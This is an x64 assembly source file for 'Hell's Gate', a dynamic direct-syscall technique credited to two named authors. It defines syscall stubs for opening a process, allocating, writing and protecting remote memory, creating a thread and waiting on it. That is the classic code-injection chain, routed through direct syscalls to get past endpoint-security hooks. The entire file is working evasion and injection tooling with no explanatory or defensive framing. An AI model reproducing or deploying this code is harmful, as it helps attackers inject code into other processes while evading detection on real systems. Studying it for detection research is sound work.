; Hell's Gate
; Dynamic system call invocation 
; 
; by smelly__vx (@RtlMateusz) and am0nsec (@am0nsec)

.data
	wSystemCall DWORD 000h

.code 
	HellsGate PROC
		mov wSystemCall, 000h
		mov wSystemCall, ecx
		ret
	HellsGate ENDP

	SysNtOpenProcess PROC
		mov r10, rcx
		mov eax, wSystemCall

		syscall
		ret
	SysNtOpenProcess ENDP

	SysNtAllocateVirtualMem PROC
		mov r10, rcx
		mov eax, wSystemCall

		syscall
		ret
	SysNtAllocateVirtualMem ENDP

	SysNtWriteVirtualMem PROC
		mov r10, rcx
		mov eax, wSystemCall

		syscall
		ret
	SysNtWriteVirtualMem ENDP

	SysNtProtectVirtualMem PROC
		mov r10, rcx
		mov eax, wSystemCall

		syscall
		ret
	SysNtProtectVirtualMem ENDP

	SysNtCreateThreadEx PROC
		mov r10, rcx
		mov eax, wSystemCall

		syscall
		ret
	SysNtCreateThreadEx ENDP

	SysNtWaitForSingleObject PROC
		mov r10, rcx
		mov eax, wSystemCall

		syscall
		ret
	SysNtWaitForSingleObject ENDP

end
